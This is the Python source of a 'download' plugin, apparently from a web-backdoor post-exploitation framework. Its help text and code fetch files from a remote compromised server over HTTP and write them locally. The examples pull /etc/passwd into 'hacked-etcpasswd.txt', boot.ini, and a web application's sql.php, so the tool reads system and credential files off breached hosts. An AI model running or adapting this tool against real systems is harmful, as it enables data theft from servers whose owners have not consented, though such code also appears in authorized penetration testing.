"""Download a remote file

SYNOPSIS:
    download [-f] <REMOTE FILE> [<LOCAL DESTINATION>]

OPTIONS:
    -f      Overwrite destination without confirmation if it
            already exists.

DESCRIPTION:
    Download a remote file to your local system.
    - In the case the destination is a directory, the file will
    be copied into it keeping it's original file name.
    - Unless the '-f' option has been set, the download process
    aborts if the destination file already exists, and asks for
    a confirmation to overwrite the file.
    - If the LOCAL DESTINATION is not given, the plugin assumes
    destination as the current local working directory (which
    can be known with the 'lpwd' command)

    NOTE: For the moment, only a single file can be downloaded
    at the time. Recursive directory downloads and multiple
    file downloads are not available.

EXAMPLES:
    > download C:\boot.ini /tmp/pentest/
      - Download the remote boot.ini file into your local dir
    > download -f /etc/passwd ./hacked-etcpasswd.txt
      - Download the current remote passwd file and force copy
    > download /srv/www/inc/sql.php
      - Downalod the sql.php file to the current local directory

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import os, base64

if self.argc not in [2,3,4]:
    api.exit(self.help)

force = 0
arg1,arg2,arglen = [1,2,self.argc]
if self.argv[1] == '-f':
    force = 1
    arg1,arg2,arglen = [2,3,self.argc-1]

relPath = self.argv[arg1]

l_relPath = os.getcwd()
if arglen == 3:
    l_relPath = self.argv[arg2]

absPath    = rpath.abspath(relPath)
l_absPath  = os.path.abspath(l_relPath)
l_dirname  = l_absPath
l_basename = rpath.basename(absPath)

leave = P_err+self.name+': '

if not os.path.isdir(l_dirname):
    l_dirname = os.path.dirname(l_dirname)
    if os.path.isdir(l_dirname):
        l_basename = os.path.basename(l_absPath)
    else:
        api.exit(leave+'Invalid local directory: %s' % quot(l_dirname))

if not getpath(l_dirname).access('w'):
        api.exit(leave+'Write permission denied on local directory: %s' % quot(l_dirname))

l_absPath = l_dirname+os.sep+l_basename

if not force and os.path.exists(l_absPath):
    if os.path.isfile(l_absPath):
        if not reply.isyes('Local destination %s already exists, overwrite it ?' % quot(l_absPath)):
            api.exit(leave+'File transfer aborted')
    else:
        api.exit(leave+'Local destination %s already exists' % quot(l_absPath))


http.send({'FILE' : absPath})

errs = {'noexists': 'No such file or directory',
        'notafile': 'Not a file',
        'noread':   'Permission denied'}

if http.error in errs:
    api.exit(leave+'%s: %s' % (absPath, errs[http.error]))

data = base64.b64decode(http.response)
pipe = absPath+" -> "+l_absPath

try: open(l_absPath,'w').write(data)
except: api.exit(P_err+'Error downloading: '+pipe)
print P_inf+'Download complete: '+pipe
